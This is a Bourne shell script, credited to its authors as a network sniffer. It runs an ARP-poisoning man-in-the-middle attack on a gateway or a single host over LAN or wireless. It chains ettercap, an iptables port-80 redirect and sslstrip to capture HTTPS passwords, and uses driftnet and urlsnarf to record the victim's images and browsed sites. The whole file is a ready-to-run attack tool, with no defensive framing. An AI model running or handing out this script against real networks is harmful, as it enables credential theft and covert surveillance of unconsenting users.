#!/bin/sh
clear
# This cript was written by me n1tr0g3n with a lot of input from R4V3N747700 and help from all the guys on the Top-Hat-Sec.com Forum. 
#Thanks to TAPE for his input and suggestions which were utilized into the script to make it more functional. And a #special thanks to my lovely girlfriend who puts up with me being on the #computer all the time, I love you with all my #heart. We do this for the security community and hope you guys enjoy our work. Thanks for using the script and we hope #it #works wel #for you.
echo
echo ""
echo ""
echo ""
echo ""
echo ""
echo "                        n1tr0g3n's all in one Network Sniffer";
echo ""
echo "                            coded with help by R4V3N747700"
echo ""
echo "                        www.n1tr0g3n.com & www.Top-Hat-Sec.com";


sleep 3
clear
echo ""
echo ""
echo "--------------------------------------------------------------------------------------------------"
echo "A bunch of Xterm windows will open on top of eachother so just spread them out across your screen";
echo "--------------------------------------------------------------------------------------------------"
echo ""
echo "                    If SSLstrip gives you errors please rerun the script"
echo ""
echo "            when done with the attack click ENTER in the ettercap window to cleanup"
echo ""
echo ""                
sleep 4
clear


#This command will ask you for your interface name
echo
echo "Please type the name of your network interface in below";
read IFACE;
sleep 2
echo ""
echo ""
clear
echo ""
echo "  ----------------------------------------------------------------------------------"
echo ""
echo "     |-----------------------------------|   |-----------------------------------|"
echo "     |     Attack Entire Gateway         |   |        Attack single host         |"
echo "     |                                   |   |                                   |"
echo "     |    1    For LAN attack            |   |       3    For LAN attack         |"
echo "     |    2  For Wireless Attack         |   |       4  For Wireless Attack      |"
echo "     |-----------------------------------|   |-----------------------------------|"
echo ""
echo "  ----------------------------------------------------------------------------------"
echo ""
echo ""
echo ""
echo " Select Menu Option: "
read menuoption
if [ $menuoption = "1" ]; then

echo "This should be your Gateway from what I see: "
route -n | grep 'UG[ \t]' | awk '{print $2}'
echo ""
echo ""
echo "Please type the IP of your Gateway in below";
read GATEWAY;
echo ""
echo ""
echo        "Starting attack on Gateway"
route -n | grep 'UG[ \t]' | awk '{print $2}'
sleep 2
#This will allow you to forward packets from the router
echo "1" > /proc/sys/net/ipv4/ip_forward 


#This will start driftnet to capture images on your computer
sudo xterm -e driftnet -i $IFACE &


#This will start URLSnarf to show the websites the victim browses
sudo xterm -e urlsnarf -i $IFACE &


#this command will set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080


#This command will start ettercap
ettercap -TqM ARP:REMOTE // // &


#This command will start SSLStrip to start sniffing https:// passwords
sudo xterm -e sslstrip -a -l 8080 &
echo
echo "Press ENTER to stop session"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
else

if [ $menuoption = "2" ]; then

#This will allow you to forward packets from the router
echo "This should be your gateway from what I see: "
route -n | grep 'UG[ \t]' | awk '{print $2}'
echo ""
echo ""
echo "Please type the IP of your gateway in below";
read GATEWAY;
echo ""

echo        "Starting attack on gateway"
route -n | grep 'UG[ \t]' | awk '{print $2}'
sleep 2


echo "1" > /proc/sys/net/ipv4/ip_forward 


#This will start driftnet to capture images on your computer
sudo xterm -e driftnet -i $IFACE &


#This will start URLSnarf to show the websites the victim browses
sudo xterm -e urlsnarf -i $IFACE &


#this command will set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080


#This command will start ettercap
ettercap -Tq -i $IFACE -M arp:remote /$GATEWAY/ // &
#sudo xterm -e ettercap -TqM ARP:REMOTE // // & -----> command for LAN


#This command will start SSLStrip to start sniffing https:// passwords
sudo xterm -e sslstrip -a -l 8080 &


echo "Press ENTER to stop session"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
else

if [ $menuoption = "3" ]; then
#This will allow you to forward packets from the router
echo ""
echo ""
echo "This should be your gateway from what I see: "
route -n | grep 'UG[ \t]' | awk '{print $2}'
echo ""
echo ""
echo "Please type the IP of your gateway in below";
read GATEWAY3;
echo ""
echo ""
echo "Please type the IP of the target host below";
read HOST3;
echo ""
echo ""
echo " Starting Attack on Target Host"
sleep 2


echo "1" > /proc/sys/net/ipv4/ip_forward 


#This will start driftnet to capture images on your computer
sudo xterm -e driftnet -i $IFACE &


#This will start URLSnarf to show the websites the victim browses
sudo xterm -e urlsnarf -i $IFACE &


#this command will set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080


#This command will start ettercap
ettercap -TqM ARP:REMOTE /$GATEWAY3/ /$HOST3/ &
  

#This command will start SSLStrip to start sniffing https:// passwords
xterm -e sslstrip -a -l 8080 &

echo "Press ENTER to stop session"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
else

if [ $menuoption = "4" ]; then
#This will allow you to forward packets from the router
echo ""
echo ""
echo "This should be your Gateway from what I see: "
route -n | grep 'UG[ \t]' | awk '{print $2}'
echo ""
echo ""
echo "Please type the IP of your gateway in below";
read GATEWAY4;
echo ""
echo ""
echo "Please type the IP of the target host below";
read HOST4;
echo ""
echo ""
echo " Starting Attack on Target Host"
sleep 2


echo "1" > /proc/sys/net/ipv4/ip_forward 


#This will start driftnet to capture images on your computer
sudo xterm -e driftnet -i $IFACE &


#This will start URLSnarf to show the websites the victim browses
sudo xterm -e urlsnarf -i $IFACE &


#this command will set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080


#This command will start ettercap
ettercap -Tq -i $IFACE -M arp:remote /$GATEWAY4/ /$HOST4/ &


#This command will start SSLStrip to start sniffing https:// passwords
sudo xterm -e sslstrip -a -l 8080 &


echo "Press ENTER to stop session"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

fi
fi
fi
fi

